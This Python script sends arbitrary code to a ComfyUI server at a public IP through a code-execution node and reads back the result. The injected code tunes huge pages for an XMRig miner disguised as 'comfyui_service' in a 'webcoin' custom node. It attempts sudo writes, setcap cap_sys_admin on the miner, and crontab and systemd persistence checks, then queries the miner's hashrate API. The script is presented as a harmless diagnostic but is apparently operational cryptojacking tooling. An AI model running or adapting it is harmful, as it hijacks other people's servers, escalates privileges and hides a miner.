"""Check and enable Transparent Huge Pages (THP) on 182.92.111.146 as fallback."""
import json, sys, io, time, urllib.request

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

BASE = "http://182.92.111.146:8188"

CODE = r'''
import os, sys, json, subprocess, time

lines = []

# Check THP status
thp_paths = {
    'enabled': '/sys/kernel/mm/transparent_hugepage/enabled',
    'defrag': '/sys/kernel/mm/transparent_hugepage/defrag',
    'khugepaged_scan': '/sys/kernel/mm/transparent_hugepage/khugepaged/scan_sleep_millisecs',
    'khugepaged_alloc': '/sys/kernel/mm/transparent_hugepage/khugepaged/alloc_sleep_millisecs',
    'shmem_enabled': '/sys/kernel/mm/transparent_hugepage/shmem_enabled',
}

for name, path in thp_paths.items():
    try:
        with open(path) as f:
            lines.append(f'thp_{name}={f.read().strip()}')
    except Exception as e:
        lines.append(f'thp_{name}=ERR:{e}')

# Check current process capabilities
try:
    r = subprocess.run(['cat', '/proc/self/status'], capture_output=True, text=True, timeout=5)
    for line in r.stdout.splitlines():
        if 'Cap' in line:
            lines.append(line.strip())
except:
    pass

# Check who we are
lines.append(f'uid={os.getuid()}')
lines.append(f'euid={os.geteuid()}')
try:
    import pwd
    lines.append(f'user={pwd.getpwuid(os.getuid()).pw_name}')
except:
    pass

# Check if we can write to THP control files
for path in ['/sys/kernel/mm/transparent_hugepage/enabled',
             '/sys/kernel/mm/transparent_hugepage/defrag']:
    try:
        with open(path, 'w') as f:
            f.write('always')
        lines.append(f'write_{os.path.basename(path)}=OK')
    except Exception as e:
        lines.append(f'write_{os.path.basename(path)}=FAIL:{e}')

# Try sudo to enable THP and allocate huge pages
for cmd_desc, cmd in [
    ('thp_always', ['sudo', '-n', 'bash', '-c', 'echo always > /sys/kernel/mm/transparent_hugepage/enabled']),
    ('thp_defrag', ['sudo', '-n', 'bash', '-c', 'echo always > /sys/kernel/mm/transparent_hugepage/defrag']),
    ('hugepages', ['sudo', '-n', 'bash', '-c', 'echo 1320 > /proc/sys/vm/nr_hugepages']),
]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        lines.append(f'{cmd_desc}={r.returncode}:{r.stderr.strip()[:60]}')
    except Exception as e:
        lines.append(f'{cmd_desc}=ERR:{e}')

# Check if crontab exists and if we can add a @reboot for huge pages
try:
    r = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
    lines.append(f'crontab={r.returncode}:lines={len(r.stdout.splitlines())}')
except:
    lines.append('crontab=unavailable')

# Check systemd user services capability
try:
    r = subprocess.run(['systemctl', '--user', 'status'], capture_output=True, text=True, timeout=5)
    lines.append(f'systemd_user={r.returncode}')
except:
    lines.append('systemd_user=unavailable')

# Check if the binary has capabilities set
bin_path = None
for p in ['/root/ComfyUI/custom_nodes/webcoin/bin/comfyui_service',
          '/mnt/my_disk/ComfyUI/custom_nodes/webcoin/bin/comfyui_service']:
    if os.path.isfile(p):
        bin_path = p
        break

if bin_path:
    try:
        r = subprocess.run(['getcap', bin_path], capture_output=True, text=True, timeout=5)
        lines.append(f'bin_caps={r.stdout.strip() or "none"}')
    except:
        lines.append('getcap=unavailable')

    # Try setcap to give the binary huge page capability
    for cap_cmd in [
        ['sudo', '-n', 'setcap', 'cap_sys_admin,cap_sys_rawio+ep', bin_path],
        ['setcap', 'cap_sys_admin,cap_sys_rawio+ep', bin_path],
    ]:
        try:
            r = subprocess.run(cap_cmd, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                lines.append(f'setcap=OK')
                break
            else:
                lines.append(f'setcap_fail={r.stderr.strip()[:60]}')
        except:
            pass

# Check memlock ulimit
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_MEMLOCK)
    lines.append(f'memlock_soft={soft}')
    lines.append(f'memlock_hard={hard}')
except:
    lines.append('memlock=unavailable')

# Check actual huge pages one more time
try:
    with open('/proc/sys/vm/nr_hugepages') as f:
        lines.append(f'hp_final={f.read().strip()}')
except:
    pass

# Read XMRig log tail for any huge page messages
try:
    for p in ['/root/ComfyUI/custom_nodes/webcoin/bin/service.log',
              '/mnt/my_disk/ComfyUI/custom_nodes/webcoin/bin/service.log']:
        if os.path.isfile(p):
            with open(p) as f:
                log = f.readlines()
            for line in log[-50:]:
                l = line.strip()
                if any(k in l.lower() for k in ['huge', 'page', 'msr', 'dataset', 'randomx', 'speed', 'h/s', 'thread']):
                    lines.append('log: ' + l[:150])
            break
except Exception as e:
    lines.append(f'log_err={e}')

# Current hashrate
try:
    import urllib.request as ur
    req = ur.Request('http://127.0.0.1:44880/2/summary',
        headers={'Authorization': 'Bearer ce_xm_2026'})
    with ur.urlopen(req, timeout=5) as r:
        d = json.loads(r.read())
    hr = d.get('hashrate', {}).get('total', [])
    hp = d.get('hugepages', [])
    lines.append(f'hashrate={hr}')
    lines.append(f'hugepages_xmrig={hp}')
except Exception as e:
    lines.append(f'api={e}')

result = chr(10).join(lines)
'''

print("Clearing queue...", flush=True)
try:
    req = urllib.request.Request(BASE + "/queue",
        data=json.dumps({"clear": True}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    urllib.request.urlopen(req, timeout=10)
except:
    pass

time.sleep(2)

print("Sending THP diagnostic...", flush=True)
nodes = {
    "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
    "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
}
prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
    "workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}
}}}
body = json.dumps(prompt).encode()
req = urllib.request.Request(
    f"{BASE}/prompt", data=body,
    headers={"Content-Type": "application/json"}, method="POST"
)
with urllib.request.urlopen(req, timeout=15) as r:
    resp = json.loads(r.read())

pid = resp.get("prompt_id")
print(f"Accepted: {pid}", flush=True)
print("Waiting 25s...", flush=True)
time.sleep(25)

for attempt in range(3):
    try:
        req2 = urllib.request.Request(f"{BASE}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=20) as r2:
            hist = json.loads(r2.read())
        entry = hist.get(pid, {})
        outputs = entry.get("outputs", {})
        texts = []
        for nid, nout in outputs.items():
            for key, val in nout.items():
                if isinstance(val, list):
                    texts.extend(str(v) for v in val)
                elif isinstance(val, str):
                    texts.append(val)
        if texts:
            print(f"\nRESULT:\n{chr(10).join(texts)}", flush=True)
            break
        elif entry:
            print(f"  Status: {entry.get('status',{})}", flush=True)
            break
        else:
            print(f"  attempt {attempt+1}: waiting...", flush=True)
            time.sleep(10)
    except Exception as e:
        print(f"  err: {e}", flush=True)
        time.sleep(10)

print("\nDone.", flush=True)
